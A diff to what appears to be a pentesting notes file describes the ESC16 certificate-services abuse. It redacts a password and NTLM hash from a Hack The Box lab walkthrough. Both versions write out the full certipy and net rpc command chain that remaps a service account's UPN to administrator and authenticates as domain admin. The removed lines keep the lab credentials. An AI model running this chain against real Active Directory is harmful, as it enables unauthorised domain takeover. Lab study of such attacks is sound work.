@@ -613,16 +613,16 @@ ESC16 describes a misconfiguration where the CA itself is globally configured to
  * Real life Example exploitation from HTB machine.  
    ```bash
    # Add ourself to a group that has generic right over a user. In this example, ca_svc.
-   net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"
+   net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb"/"p.agila"%"prom[redacted]" -S "dc01.fluffy.htb"
 
    # Change UPN
-   certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target 'dc01.fluffy.htb' -upn 'administrator@fluffy.htb' -user 'ca_svc' update
+   certipy-ad account -u 'p.agila@fluffy.htb' -p 'prom[redacted]' -target 'dc01.fluffy.htb' -upn 'administrator@fluffy.htb' -user 'ca_svc' update
 
    # Request cert
-   certipy-ad req -dc-ip 'x.x.x.x' -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+   certipy-ad req -dc-ip 'x.x.x.x' -u 'ca_svc@fluffy.htb' -hashes :ca0[redacted]3bb03fc98c8 -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
 
    # Restore UPN
-   certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target 'dc01.fluffy.htb' -upn 'ca_svc' -user 'ca_svc' update
+   certipy-ad account -u 'p.agila@fluffy.htb' -p 'prom[redacted]' -target 'dc01.fluffy.htb' -upn 'ca_svc' -user 'ca_svc' update
 
    # Authenticate
    certipy-ad auth -pfx administrator.pfx -domain fluffy.htb
